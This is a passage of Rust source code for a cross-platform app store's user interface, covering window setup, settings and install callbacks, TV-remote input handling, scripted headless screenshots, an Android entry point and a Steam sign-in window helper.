            message = format!("{} removed from this TV's app list", entry.name);
        }
        // A Flatpak is removed by Flatpak; it carries on after this returns.
        if let Some(app_id) = id.strip_prefix("flathub:") {
            let args = ["uninstall", "--noninteractive", "--assumeyes", app_id].map(String::from);
            message = match (self.runner)(&self.dirs.flatpak, &args) {
                Ok(()) => format!("Uninstalling {}…", entry.name),
                Err(_) => {
                    format!("{} removed from your library. Flatpak could not be started to uninstall it.", entry.name)
                }
            };
        }
        let store = ui.global::<Store>();
        if store.get_app().id == id {
            store.set_installed_version(SharedString::new());
        }
        self.refresh(ui);
        self.toast(ui, &message, false);
    }
}

fn unix_date(secs: u64) -> String {
    // Reuse the AUR module's civil-date conversion through a tiny local copy.
    let z = (secs / 86_400) as i64 + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!("{y:04}-{m:02}-{d:02}")
}

fn find_card(store: &Store, id: &str) -> Option<AppCard> {
    let in_sections = store.get_sections().iter().flat_map(|s| s.apps.iter().collect::<Vec<_>>()).find(|c| c.id == id);
    in_sections
        .or_else(|| store.get_results().iter().find(|c| c.id == id))
        .or_else(|| store.get_suggestions().iter().find(|c| c.id == id))
        .or_else(|| store.get_library().iter().map(|r| r.card).find(|c| c.id == id))
        .or_else(|| store.get_favourites().iter().find(|c| c.id == id))
}

/// Create the window and wire it to the catalog, without starting the event loop.
pub fn build(options: &Options) -> Result<(AppWindow, Arc<App>), Box<dyn std::error::Error>> {
    let mut platform = options.platform.clone().unwrap_or_else(Platform::detect);
    let detected = platform.form_factor;
    let dirs = options.dirs.clone().unwrap_or_else(Dirs::for_current_user);
    // The demo catalog gets its own library so fictional apps never mix with real ones.
    let state_path = options
        .state_file
        .clone()
        .unwrap_or_else(|| dirs.config.join(if options.demo { "demo-state.json" } else { "state.json" }));
    let state = State::load(&state_path);
    // Which layout: the command line first, then the choice saved in Settings, then
    // what the device looks like. The TV layout also means "prefer TV builds".
    match options.shell {
        Some(Shell::Tv) => platform.form_factor = FormFactor::Tv,
        Some(_) if platform.form_factor == FormFactor::Tv => platform.form_factor = FormFactor::Desktop,
        Some(_) => {}
        None => platform.form_factor = form_for(&state.settings.interface, detected),
    }
    // A controller with nothing else pointing at a TV: worth one question.
    let ask_tv = options.shell.is_none()
        && platform.form_factor == FormFactor::Desktop
        && state.settings.interface.is_empty()
        && !state.settings.asked_about_tv
        && options
            .controller
            .unwrap_or_else(|| options.platform.is_none() && bilby_core::platform::controller_attached());
    let demo = options.demo;
    let catalog_factory: CatalogFactory = options.catalog_factory.clone().unwrap_or_else(|| {
        Arc::new(move |platform: &Platform, settings: &Settings, dirs: &Dirs| {
            make_catalog(platform, demo, settings, dirs)
        })
    });
    let catalog = catalog_factory(&platform, &state.settings, &dirs);

    let ui = AppWindow::new()?;
    let store = ui.global::<Store>();
    let shell = options.shell.unwrap_or_else(|| shell_for(platform.form_factor));
    store.set_shell(shell);
    // A forced interface stays put; otherwise desktop and mobile follow the window width.
    store.set_adaptive(options.shell.is_none() && shell != Shell::Tv);
    store.set_ask_tv(ask_tv);
    store.set_demo(options.demo);
    store.set_app_version(env!("CARGO_PKG_VERSION").into());
    store.set_platform_title(platform.title().into());
    store.set_device_name(platform.friendly().into());
    let mut facts = platform.facts();
    let sources: Vec<_> = catalog.active_sources().iter().map(|s| s.label()).collect();
    facts.push(("Sources".to_string(), sources.join(", ")));
    store.set_facts(ModelRc::new(VecModel::from(
        facts.into_iter().map(|(name, value)| Fact { name: name.into(), value: value.into() }).collect::<Vec<_>>(),
    )));

    // A demo or a preview of another device must never look at, let alone change, the
    // real system: it gets a made-up one.
    let pretend = options.demo || options.platform.is_some();
    let host: Arc<dyn bilby_core::os::Host> = match &options.host {
        Some(host) => host.clone(),
        None if pretend => Arc::new(bilby_core::os::demo_host(&platform)),
        None => Arc::new(bilby_core::os::RealHost),
    };
    let mut system = bilby_core::os::describe(host.as_ref(), &platform);
    if pretend && !options.demo && options.host.is_none() {
        system.note = format!("This is a preview of another device, so these details are made up. {}", system.note);
    }

    let app = Arc::new(App {
        ui: ui.as_weak(),
        catalog: RwLock::new(catalog),
        platform: RwLock::new(platform),
        detected,
        theme_override: options.theme.clone(),
        inline: options.inline,
        dirs,
        state_path,
        state: Mutex::new(state),
        results: Mutex::new((String::new(), Vec::new())),
        updates: Mutex::new(HashMap::new()),
        last_checked: AtomicU64::new(0),
        current: Mutex::new(Current::default()),
        search_generation: AtomicU64::new(0),
        details_generation: AtomicU64::new(0),
        install_when_loaded: Mutex::new(None),
        toast_generation: Arc::new(AtomicU64::new(0)),
        cancel_install: Arc::new(AtomicBool::new(false)),
        store_app: match &options.store_app {
            Some(id) => AppId::parse(id),
            None if options.demo => None,
            None => Some(AppId::new(SourceKind::GitHub, bilby_core::catalog::STORE_REPOSITORY)),
        },
        update_queue: Mutex::new(std::collections::VecDeque::new()),
        pictures_requested: Mutex::new(HashSet::new()),
        opener: options.opener.clone().unwrap_or_else(|| Arc::new(install::open_with_system)),
        launcher: options.launcher.clone().unwrap_or_else(|| Arc::new(install::launch)),
        runner: options.runner.clone().unwrap_or_else(|| Arc::new(install::launch_with)),
        icon_urls: Mutex::new(HashMap::new()),
        catalog_factory,
        host,
        system,
        system_check: Mutex::new(None),
        collections: Mutex::new(Vec::new()),
        self_program: options.self_program.clone(),
        signin_generation: AtomicU64::new(0),
        steam_libraries: options.steam_libraries.clone(),
        result_filter: Mutex::new(None),
        alternates: Mutex::new(HashMap::new()),
        signin: options.signin.clone().unwrap_or_else(|| Arc::new(signin_window)),
        // The demo is a made-up device with everything in place, unless told otherwise.
        fuse: std::sync::RwLock::new(options.fuse.unwrap_or_else(|| match options.demo {
            true => bilby_core::needs::Fuse { library: true, mounter: true },
            false => bilby_core::needs::fuse_here(),
        })),
        fuse_given: options.fuse.is_some() || options.demo,
        layering: options.layering.clone().or_else(|| match options.demo {
            true => None,
            false => bilby_core::needs::layering_here(),
        }),
        fuse_staged: std::sync::atomic::AtomicBool::new(false),
        fuse_just_staged: std::sync::atomic::AtomicBool::new(false),
        restart: options.restart.clone().unwrap_or_else(|| Arc::new(restart_device)),
        needed: Mutex::new(None),
        lacks_fuse: std::sync::atomic::AtomicBool::new(false),
        steam: std::sync::RwLock::new(None),
        steam_generation: AtomicU64::new(0),
        elsewhere: std::sync::RwLock::new(Elsewhere::default()),
        heard: options.heard.clone(),
        #[cfg(not(target_os = "android"))]
        player: std::sync::OnceLock::new(),
        silent: options.inline || options.screenshot.is_some(),
        browser: options.browser.clone().unwrap_or_else(|| Arc::new(install::open_url)),
        picker: options.picker.clone().unwrap_or_else(|| Arc::new(system_picker)),
        asked_folder: Mutex::new(None),
        self_new: Mutex::new(None),
        pending: Mutex::new(None),
        known_adult: Mutex::new(HashSet::new()),
        new_pin: Mutex::new(None),
        adult_unlocked: std::sync::atomic::AtomicBool::new(false),
        install_cleared: std::sync::atomic::AtomicBool::new(false),
    });
    app.note_self(&ui);
    app.scan_installed(&ui);
    *app.steam.write().unwrap() = app.state().steam;
    app.apply_menu_entry(&ui);
    app.show_system(&ui, 0, "");

    // The TV interface is designed dark; elsewhere the saved preference applies.
    let theme = options.theme.clone().unwrap_or_else(|| app.state().settings.theme);
    ui.global::<Theme>().set_mode(if shell == Shell::Tv { 2 } else { theme_mode(&theme) });
    app.refresh(&ui);
    app.refresh_settings(&ui);
    app.load_pictures(&ui);
    app.load_collections(&ui);
    // Read the system's package databases in the background: it can take a moment on a
    // large distribution, and the first search should not be the one to pay for it.
    app.job(
        |app| app.catalog().system_repositories(),
        |_app, ui, repositories| {
            if repositories.is_empty() {
                return;
            }
            let store = ui.global::<Store>();
            let mut facts: Vec<Fact> = store.get_facts().iter().collect();
            facts.push(Fact { name: "System repositories".into(), value: repositories.join(", ").into() });
            store.set_facts(ModelRc::new(VecModel::from(facts)));
        },
    );
    if let Some(theme) = &options.theme {
        store.set_theme_mode(theme_mode(theme));
    }

    // Each handler looks the window up again: callbacks must not keep it alive.
    macro_rules! on {
        ($setter:ident, |$app:ident, $ui:ident $(, $arg:ident)*| $body:block) => {
            store.$setter({
                let $app = app.clone();
                move |$($arg),*| {
                    if let Some($ui) = $app.ui.upgrade() {
                        let $ui = &$ui;
                        $body
                    }
                }
            });
        };
    }
    on!(on_search, |app, ui, query| { app.search(ui, &query) });
    on!(on_typing, |app, ui, text| { app.typing(ui, &text) });
    on!(on_open, |app, ui, id| { app.open(ui, &id) });
    on!(on_close_details, |app, ui| { app.close_details(ui) });
    on!(on_retry_details, |app, ui| {
        let id = app.current.lock().unwrap().id.clone();
        if !id.is_empty() {
            app.open(ui, &id);
        }
    });
    on!(on_select_version, |app, ui, index| { app.select_version(ui, index) });
    on!(on_install, |app, ui, index| { app.install(ui, index) });
    on!(on_cancel_install, |app, ui| {
        let _ = ui;
        app.cancel_install.store(true, Ordering::SeqCst);
    });
    on!(on_check_updates, |app, ui| { app.check_updates(ui, true) });
    on!(on_update_app, |app, ui, id| { app.update_app(ui, &id) });
    on!(on_update_all, |app, ui| { app.update_all(ui) });
    on!(on_remove_from_library, |app, ui, id| { app.remove_from_library(ui, &id) });
    on!(on_skip_update, |app, ui, id| { app.skip_update(ui, &id) });
    on!(on_toggle_favourite, |app, ui| { app.toggle_favourite(ui) });
    on!(on_launch, |app, ui| { app.launch(ui) });
    on!(on_quick_install, |app, ui, id| { app.quick_install(ui, &id) });
    on!(on_download_hidden, |app, ui, index| { app.download_hidden(ui, index) });
    on!(on_set_theme, |app, ui, mode| {
        let name = ["system", "light", "dark"].get(mode as usize).copied().unwrap_or("system");
        app.update_state(ui, |state| state.settings.theme = name.to_string());
        if ui.global::<Store>().get_shell() != Shell::Tv {
            ui.global::<Theme>().set_mode(theme_mode(name));
        }
        app.refresh_settings(ui);
    });
    on!(on_set_prereleases, |app, ui, enabled| {
        app.update_state(ui, |state| state.settings.include_prereleases = enabled);
        app.rebuild_catalog();
        app.refresh_settings(ui);
    });
    on!(on_set_ratings, |app, ui, enabled| {
        app.update_state(ui, |state| state.settings.hide_ratings = !enabled);
        if enabled {
            app.load_ratings(ui);
        } else {
            app.catalog().drop_ratings();
            app.refresh(ui);
        }
        app.refresh_settings(ui);
    });
    on!(on_set_check_on_start, |app, ui, enabled| {
        app.update_state(ui, |state| state.settings.skip_update_check_on_start = !enabled);
        app.refresh_settings(ui);
    });
    on!(on_open_downloads, |app, ui| {
        let folder = app.downloads_folder();
        let result = std::fs::create_dir_all(&folder).map_err(Error::from).and_then(|_| (app.opener)(&folder));
        if let Err(e) = result {
            app.toast(ui, &format!("Couldn't open the downloads folder: {e}"), true);
        }
    });
    on!(on_github_signin, |app, ui| { app.github_signin(ui) });
    on!(on_github_cancel, |app, ui| { app.github_cancel(ui) });
    on!(on_steam_signin, |app, ui| { app.steam_signin(ui) });
    on!(on_check_store_update, |app, ui| { app.check_store_update_now(ui) });
    on!(on_steam_signin_qr, |app, ui| { app.steam_signin_qr(ui) });
    on!(on_steam_cancel, |app, ui| { app.steam_cancel(ui) });
    on!(on_steam_signout, |app, ui| { app.steam_signout(ui) });
    on!(on_save_token, |app, ui, token| {
        let token = token.trim().to_string();
        let cleared = token.is_empty();
        app.update_state(ui, |state| state.settings.github_token = token);
        app.rebuild_catalog();
        app.refresh_settings(ui);
        app.toast(ui, if cleared { "Signed out of GitHub" } else { "Token saved on this device" }, false);
    });
    on!(on_clear_cache, |app, ui| {
        // Only the store's own cache folders, never a path from outside.
        let result = ["http", "icons"].iter().try_for_each(|name| {
            let folder = app.dirs.cache.join(name);
            if folder.exists() {
                std::fs::remove_dir_all(&folder)
            } else {
                Ok(())
            }
        });
        match result {
            Ok(()) => app.toast(ui, "Cached catalog data cleared", false),
            Err(e) => app.toast(ui, &format!("Couldn't clear the cache: {e}"), true),
        }
    });
    on!(on_clear_recent, |app, ui| {
        app.update_state(ui, |state| state.recent_searches.clear());
        app.refresh(ui);
    });
    on!(on_open_url, |app, ui, url| {
        if let Err(e) = install::open_url(&url) {
            app.toast(ui, &e.to_string(), true);
        }
    });
    on!(on_set_in_menu, |app, ui, shown| {
        app.update_state(ui, |state| state.settings.hide_from_menu = !shown);
        app.apply_menu_entry(ui);
        app.refresh_settings(ui);
    });
    on!(on_set_reduce_motion, |app, ui, on| {
        app.update_state(ui, |state| state.settings.reduce_motion = on);
        app.refresh_settings(ui);
    });
    on!(on_play, |app, _ui, kind| {
        if let Some(sound) = sound::Sound::from_number(kind) {
            app.play(sound);
        }
    });
    on!(on_set_sounds, |app, ui, on| {
        app.update_state(ui, |state| state.settings.mute_sounds = !on);
        app.refresh_settings(ui);
        // Switching them on is heard at once; switching them off, of course, is not.
        app.play(sound::Sound::Toggle);
    });
    on!(on_add_own_source, |app, ui, url| { app.add_own_source(ui, &url) });
    on!(on_remove_own_source, |app, ui, url| { app.remove_own_source(ui, &url) });
    on!(on_choose_downloads, |app, ui| { app.choose_downloads(ui) });
    on!(on_set_downloads, |app, ui, path| { app.set_downloads(ui, &path) });
    on!(on_set_ask_where, |app, ui, on| {
        app.update_state(ui, |state| state.settings.ask_where = on);
        app.refresh_settings(ui);
    });
    on!(on_set_prefer_kind, |app, ui, kind| {
        let kind = bilby_core::compat::Prefer::from_number(kind);
        app.update_state(ui, |state| state.settings.prefer_kind = kind.name().to_string());
        // Which file is offered first depends on it: build the catalog again.
        app.rebuild_catalog();
        app.refresh_settings(ui);
        app.refresh(ui);
    });
    on!(on_set_essentials, |app, ui, on| {
        app.update_state(ui, |state| state.settings.hide_essentials = !on);
        // What is recommended depends on it: build the catalog again and redraw.
        app.rebuild_catalog();
        app.collections.lock().unwrap().clear();
        app.load_collections(ui);
        app.refresh_settings(ui);
        app.refresh(ui);
    });
    on!(on_set_family_mode, |app, ui, on| { app.request_setting(ui, Change::FamilyMode(on)) });
    on!(on_set_adult_on_home, |app, ui, on| { app.request_setting(ui, Change::AdultOnHome(on)) });
    on!(on_set_adult_uncovered, |app, ui, on| { app.request_setting(ui, Change::AdultUncovered(on)) });
    on!(on_set_pin_for_installs, |app, ui, on| { app.request_setting(ui, Change::PinForInstalls(on)) });
    on!(on_set_pin, |app, ui| { app.request_setting(ui, Change::SetPin) });
    on!(on_remove_pin, |app, ui| { app.request_setting(ui, Change::RemovePin) });
    on!(on_gate_answer, |app, ui, yes| { app.gate_answer(ui, yes) });
    on!(on_gate_pin, |app, ui, entry| { app.gate_pin(ui, &entry) });
    on!(on_gate_cancel, |app, ui| { app.gate_cancel(ui) });
    on!(on_set_source, |app, ui, name, on| {
        let name = name.to_string();
        app.update_state(ui, |state| {
            state.settings.disabled_sources.retain(|n| *n != name);
            if !on {
                state.settings.disabled_sources.push(name.clone());
            }
        });
        // What is listed depends on it: build the catalog again and redraw.
        app.rebuild_catalog();
        app.collections.lock().unwrap().clear();
        app.load_collections(ui);
        app.refresh(ui);
        app.refresh_settings(ui);
    });
    on!(on_filter_results, |app, ui, name| {
        *app.result_filter.lock().unwrap() = source_named(name.as_str());
        app.refresh(ui);
    });
    on!(on_set_interface, |app, ui, mode| { app.set_interface(ui, mode) });
    on!(on_answer_tv, |app, ui, yes| {
        if yes {
            app.set_interface(ui, 2);
        } else {
            app.update_state(ui, |state| state.settings.asked_about_tv = true);
            ui.global::<Store>().set_ask_tv(false);
        }
    });
    on!(on_system_check, |app, ui| { app.check_system(ui, true) });
    on!(on_system_update, |app, ui| { app.update_system(ui) });
    on!(on_system_handoff_open, |app, ui| {
        if let Some(handoff) = &app.system.handoff {
            if let Err(e) = (app.opener)(std::path::Path::new(handoff.target)) {
                app.toast(ui, &e.to_string(), true);
            }
        }
    });
    on!(on_dismiss_welcome, |app, ui| {
        app.update_state(ui, |state| state.settings.welcomed = true);
        app.refresh_settings(ui);
    });
    on!(on_view_store_update, |app, ui| {
        // The store's own page is an app page like any other: same files, same checks.
        if let Some(id) = app.store_app.clone() {
            app.open(ui, &id.to_string());
        }
    });
    on!(on_dismiss_toast, |app, ui| {
        let _ = &app;
        ui.global::<Store>().set_toast(SharedString::new());
    });

    if let Some(page) = options.page {
        store.set_page(page);
    }
    Ok((ui, app))
}

/// Translate what a TV remote sends into keys the interface understands.
///
/// Slint passes on the keys of a keyboard, but drops the "Back" key that remotes and
/// media keyboards send, so pressing it did nothing. Here it becomes Escape, which every
/// page already treats as "back". "Select" becomes Return. In the TV layout the right
/// and "back" mouse buttons do the same, because air-mouse remotes send those for Back.
#[cfg(not(target_os = "android"))]
fn translate_remote_keys(ui: &AppWindow) {
    use slint::platform::{Key, WindowEvent};
    use slint::winit_030::winit::event::{ElementState, MouseButton, WindowEvent as Raw};
    use slint::winit_030::winit::keyboard::{Key as RawKey, NamedKey};
    use slint::winit_030::{EventResult, WinitWindowAccessor};
    let weak = ui.as_weak();
    ui.window().on_winit_window_event(move |window, event| {
        let on_tv = || weak.upgrade().is_some_and(|ui| ui.get_effective() == Shell::Tv);
        let (key, state) = match event {
            Raw::KeyboardInput { event, .. } => match &event.logical_key {
                RawKey::Named(NamedKey::BrowserBack | NamedKey::GoBack) => (Key::Escape, event.state),
                RawKey::Named(NamedKey::Select | NamedKey::Accept) => (Key::Return, event.state),
                _ => return EventResult::Propagate,
            },
            Raw::MouseInput { button: MouseButton::Right | MouseButton::Back, state, .. } if on_tv() => {
                (Key::Escape, *state)
            }
            _ => return EventResult::Propagate,
        };
        let text: SharedString = key.into();
        window.dispatch_event(match state {
            ElementState::Pressed => WindowEvent::KeyPressed { text },
            ElementState::Released => WindowEvent::KeyReleased { text },
        });
        EventResult::PreventDefault
    });
}

pub fn run(mut options: Options) -> Result<(), Box<dyn std::error::Error>> {
    // An AppImage says where its file is. A demo, a preview of another device or a
    // screenshot run is not a real start and adds nothing to the app menu.
    let real = !options.demo && options.platform.is_none() && options.screenshot.is_none();
    if real && cfg!(target_os = "linux") && options.self_program.is_none() {
        options.self_program = std::env::var_os("APPIMAGE").map(PathBuf::from).filter(|path| path.is_file());
    }
    let (ui, app) = build(&options)?;
    #[cfg(not(target_os = "android"))]
    translate_remote_keys(&ui);
    let store = ui.global::<Store>();
    if let Some((w, h)) = options.size {
        ui.window().set_size(slint::LogicalSize::new(w as f32, h as f32));
    } else if store.get_shell() == Shell::Tv && options.screenshot.is_none() {
        ui.window().set_fullscreen(true);
    }
    if let Some(query) = &options.search {
        store.set_query(query.as_str().into());
        app.search(&ui, query);
    }
    if let Some(target) = &options.open {
        let id = AppId::from_user_input(target).map(|id| id.to_string()).unwrap_or_else(|| target.clone());
        app.open(&ui, &id);
    }
    app.load_ratings(&ui);
    // Quietly look for updates at start-up (unless turned off): it is the reason to open
    // the store again.
    if !app.state().settings.skip_update_check_on_start {
        app.check_updates(&ui, false);
        app.check_store_update(&ui);
        app.check_system(&ui, false);
    }

    if let Some(path) = options.screenshot.clone() {
        screenshot_after_script(&ui, options.script.clone(), options.settle_ms, path, options.report.clone());
    }
    ui.run()?;
    Ok(())
}

/// Replays scripted input through the window exactly as real key presses and clicks
/// would arrive, one step every 250 ms, then saves a frame and quits. This is how the
/// interfaces are exercised headlessly (CI, documentation screenshots).
fn screenshot_after_script(
    ui: &AppWindow,
    script: Vec<String>,
    settle_ms: u64,
    path: PathBuf,
    report: Option<PathBuf>,
) {
    use slint::platform::{Key, PointerEventButton, WindowEvent};
    let settle = std::time::Duration::from_millis(if settle_ms == 0 { 600 } else { settle_ms });
    let weak = ui.as_weak();
    let mut steps = script.into_iter().filter(|s| !s.is_empty());
    let timer = std::rc::Rc::new(slint::Timer::default());
    let timer_handle = timer.clone();
    timer.start(slint::TimerMode::Repeated, std::time::Duration::from_millis(250), move || {
        let Some(ui) = weak.upgrade() else { return };
        let window = ui.window();
        let key = |text: SharedString| {
            window.dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
            window.dispatch_event(WindowEvent::KeyReleased { text });
        };
        match steps.next() {
            Some(step) => match step.as_str() {
                "up" => key(Key::UpArrow.into()),
                "down" => key(Key::DownArrow.into()),
                "left" => key(Key::LeftArrow.into()),
                "right" => key(Key::RightArrow.into()),
                "ok" => key(Key::Return.into()),
                "back" => key(Key::Escape.into()),
                "tab" => key(Key::Tab.into()),
                "wait" => {}
                other => {
                    if let Some((x, y)) = other.strip_prefix("click:").and_then(|p| p.split_once(',')) {
                        let position = slint::LogicalPosition::new(x.parse().unwrap_or(0.0), y.parse().unwrap_or(0.0));
                        window.dispatch_event(WindowEvent::PointerMoved { position });
                        window
                            .dispatch_event(WindowEvent::PointerPressed { position, button: PointerEventButton::Left });
                        window.dispatch_event(WindowEvent::PointerReleased {
                            position,
                            button: PointerEventButton::Left,
                        });
                    } else if let Some(id) = other.strip_prefix("update:") {
                        ui.global::<Store>().invoke_update_app(id.into());
                    } else if let Some(index) = other.strip_prefix("install:") {
                        // The same callback the Install button calls; independent of layout.
                        ui.global::<Store>().invoke_install(index.parse().unwrap_or(0));
                    } else if let Some(text) = other.strip_prefix("text:") {
                        for c in text.chars() {
                            key(c.to_string().into());
                        }
                    } else {
                        eprintln!("unknown script step \"{other}\"");
                    }
                }
            },
            None => {
                timer_handle.stop();
                let weak = ui.as_weak();
                let path = path.clone();
                let report = report.clone();
                slint::Timer::single_shot(settle, move || {
                    let Some(ui) = weak.upgrade() else { return };
                    let result = ui.window().take_snapshot().map_err(|e| e.to_string()).and_then(|pixels| {
                        let file = std::fs::File::create(&path).map_err(|e| e.to_string())?;
                        let mut encoder =
                            png::Encoder::new(std::io::BufWriter::new(file), pixels.width(), pixels.height());
                        encoder.set_color(png::ColorType::Rgba);
                        encoder.set_depth(png::BitDepth::Eight);
                        let mut writer = encoder.write_header().map_err(|e| e.to_string())?;
                        writer.write_image_data(pixels.as_bytes()).map_err(|e| e.to_string())
                    });
                    if let Err(e) = result {
                        eprintln!("screenshot failed: {e}");
                    }
                    if let Some(report) = &report {
                        if let Err(e) = std::fs::write(report, describe(&ui)) {
                            eprintln!("report failed: {e}");
                        }
                    }
                    let _ = slint::quit_event_loop();
                });
            }
        }
    });
}

/// What the interface is showing, as `key=value` lines. Lets a script check the real,
/// threaded application from outside.
fn describe(ui: &AppWindow) -> String {
    let store = ui.global::<Store>();
    let shell = match ui.get_effective() {
        Shell::Desktop => "desktop",
        Shell::Mobile => "mobile",
        Shell::Tv => "tv",
    };
    let first_option = store.get_options().row_data(0).map(|o| o.label.to_string()).unwrap_or_default();
    [
        format!("shell={shell}"),
        format!("page={}", store.get_page()),
        format!("details_open={}", store.get_details_open()),
        format!("details_loading={}", store.get_details_loading()),
        format!("details_error={}", store.get_details_error()),
        format!("app={}", store.get_app().id),
        format!("options={}", store.get_options().row_count()),
        format!("first_option={first_option}"),
        format!("hidden={}", store.get_hidden().row_count()),
        format!("installed_version={}", store.get_installed_version()),
        format!("install_state={}", store.get_install_state()),
        format!("install_message={}", store.get_install_message()),
        format!("results={}", store.get_results().row_count()),
        format!("suggestions={}", store.get_suggestions().row_count()),
        format!("searching={}", store.get_searching()),
        format!("library={}", store.get_library().row_count()),
        format!("updates={}", store.get_updates_count()),
        format!("checking_updates={}", store.get_checking_updates()),
        format!("updating={}", store.get_updating_id()),
        format!("store_update={}", store.get_store_update()),
        format!("system={}", store.get_system_name()),
        format!("system_state={}", store.get_system_state()),
        format!("system_headline={}", store.get_system_headline()),
        format!("system_updates={}", store.get_system_updates().row_count()),
        format!("toast={}", store.get_toast()),
    ]
    .join("\n")
        + "\n"
}

/// Android entry point (NativeActivity / GameActivity via `android-activity`).
#[cfg(target_os = "android")]
#[no_mangle]
fn android_main(android_app: slint::android::AndroidApp) {
    let internal = android_app.internal_data_path().unwrap_or_else(std::env::temp_dir);
    let downloads = android_app.external_data_path().unwrap_or_else(|| internal.clone());
    slint::android::init(android_app).expect("Slint Android backend failed to start");
    let dirs = Dirs {
        downloads: downloads.join("downloads"),
        applications: internal.join("apps"),
        menu: internal.join("menu"),
        flatpak: internal.join("flatpak-program"),
        elevate: internal.join("elevate-program"),
        terminal: None,
        flatpak_roots: vec![internal.join("flatpak")],
        cache: internal.join("cache"),
        config: internal.join("config"),
    };
    if let Err(e) = run(Options { dirs: Some(dirs), ..Default::default() }) {
        eprintln!("bilby: {e}");
    }
}

/// A code for a phone's camera, as a picture: one dot per square with a clear margin
/// around it, to be drawn large without smoothing.
fn code_image(text: &str) -> slint::Image {
    let Some(code) = bilby_core::steam_qr::code(text) else { return slint::Image::default() };
    const MARGIN: usize = 2;
    let side = code.size + 2 * MARGIN;
    let mut pixels = slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(side as u32, side as u32);
    for (at, pixel) in pixels.make_mut_slice().iter_mut().enumerate() {
        let (x, y) = (at % side, at / side);
        let inside = (MARGIN..MARGIN + code.size).contains(&x) && (MARGIN..MARGIN + code.size).contains(&y);
        let dark = inside && code.dark[(y - MARGIN) * code.size + (x - MARGIN)];
        let shade = if dark { 0 } else { 255 };
        *pixel = slint::Rgba8Pixel { r: shade, g: shade, b: shade, a: 255 };
    }
    slint::Image::from_rgba8(pixels)
}

/// Web addresses in a piece of text, in the order they appear: each once, at most six,
/// without the full stop or bracket that happened to follow.
pub fn links_in(text: &str) -> Vec<String> {
    let mut links: Vec<String> = Vec::new();
    for word in text.split(|c: char| c.is_whitespace() || matches!(c, '<' | '>' | '"' | '(' | '[' | ']')) {
        let Some(start) = word.find("https://").or_else(|| word.find("http://")) else { continue };
        let link = word[start..].trim_end_matches(['.', ',', ';', ':', '!', '?', ')', '\'', '*', '`']);
        let host = link.split("://").nth(1).unwrap_or("").split('/').next().unwrap_or("");
        if host.contains('.') && link.len() <= 300 && !links.iter().any(|seen| seen == link) {
            links.push(link.to_string());
        }
        if links.len() == 6 {
            break;
        }
    }
    links
}

/// Put the links of what is being shown where a remote can pick them.
fn show_links(store: &Store) {
    let text = format!("{}\n{}", store.get_about(), store.get_notes());
    let links: Vec<SharedString> = links_in(&text).into_iter().map(SharedString::from).collect();
    store.set_about_links(ModelRc::new(VecModel::from(links)));
}

/// Which row of a search an app belongs in, by where it comes from.
fn kind_of(id: &str) -> &'static str {
    match id.split(':').next().unwrap_or("") {
        "steam" => "Games",
        "web" => "Web apps",
        "github" | "gitlab" | "codeberg" => "From developers",
        "apt" | "pacman" | "dnf" | "zypper" | "aur" => "System packages",
        "own" => "From your own sources",
        _ => "Apps",
    }
}

/// The store's own picture, for its card in the Library.
fn own_icon() -> slint::Image {
    let Ok(picture) = image::load_from_memory(ICON_PNG) else { return slint::Image::default() };
    let picture = picture.thumbnail(128, 128).to_rgba8();
    let buffer = slint::SharedPixelBuffer::<slint::Rgba8Pixel>::clone_from_slice(
        picture.as_raw(),
        picture.width(),
        picture.height(),
    );
    slint::Image::from_rgba8(buffer)
}

/// In place of an address: this picture is the website's own, found at the site.
const SITE_ICON: &str = "site:";

/// The id of the Library's card for the device itself, which opens its page.
const SYSTEM_CARD: &str = "bilby:this-device";

/// The store's sign-in window while it is open, so it can be closed from here.
static SIGNIN_WINDOW: Mutex<Option<std::process::Child>> = Mutex::new(None);

/// The program that shows the sign-in window. On Windows and macOS it is this program
/// run another way; on Linux it is a separate file beside this one, so that the store
/// itself starts on systems without the web engine the window needs.
fn signin_command() -> Option<std::process::Command> {
    let me = std::env::current_exe().ok()?;
    if cfg!(any(windows, target_os = "macos")) {
        let mut command = std::process::Command::new(me);
        command.arg("--signin");
        return Some(command);
    }
    let beside = me.parent().map(|dir| dir.join("bilby-signin")).filter(|p| p.is_file());
    let on_path =
        || std::env::split_paths(&std::env::var_os("PATH")?).map(|dir| dir.join("bilby-signin")).find(|p| p.is_file());
    beside.or_else(on_path).map(std::process::Command::new)
}

/// Show Steam's sign-in page in the store's own small window and wait for it to hand
/// back what the account owns, or to be closed.
fn signin_window(data_dir: &std::path::Path) -> bilby_core::Result<Option<String>> {
    use std::io::Read;
    use std::process::Stdio;
    let cannot = || {
        let needs = if cfg!(target_os = "linux") {
            " It needs WebKitGTK (the package libwebkit2gtk-4.1) on this system."
        } else {
            ""
        };
        Error::Unsupported(format!("The sign-in window could not be opened.{needs}"))
    };
    let mut command = signin_command().ok_or_else(cannot)?;
    std::fs::create_dir_all(data_dir)?;
    command
        .arg("steam")
        .arg("--data-dir")
        .arg(data_dir)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    let mut window = command.spawn().map_err(|_| cannot())?;
    let mut said = window.stdout.take();
    *SIGNIN_WINDOW.lock().unwrap() = Some(window);
    let mut line = String::new();
    if let Some(out) = said.as_mut() {
        let _ = out.read_to_string(&mut line);
    }
    // Gone already means it was closed from the store: the same as the person closing it.
    let Some(mut window) = SIGNIN_WINDOW.lock().unwrap().take() else { return Ok(None) };
    match window.wait()?.code() {
        Some(0) if !line.trim().is_empty() => Ok(Some(line)),
        Some(3) => Ok(None),
        _ => Err(cannot()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn initials_from_names() {
        assert_eq!(initials("Tidewave"), "Ti");
        assert_eq!(initials("fern-launcher"), "Fl");
        assert_eq!(initials("bat"), "Ba");
        assert_eq!(initials("x"), "X");
        assert_eq!(initials(""), "?");
    }

    #[test]
    fn notes_lose_their_markdown() {
        assert_eq!(plain_notes("## New\n\n- **Fast** `startup`\n* Fixes"), "New\n\n•  Fast startup\n•  Fixes");
    }

    #[test]
    fn notes_keep_their_words_and_lose_their_plumbing() {
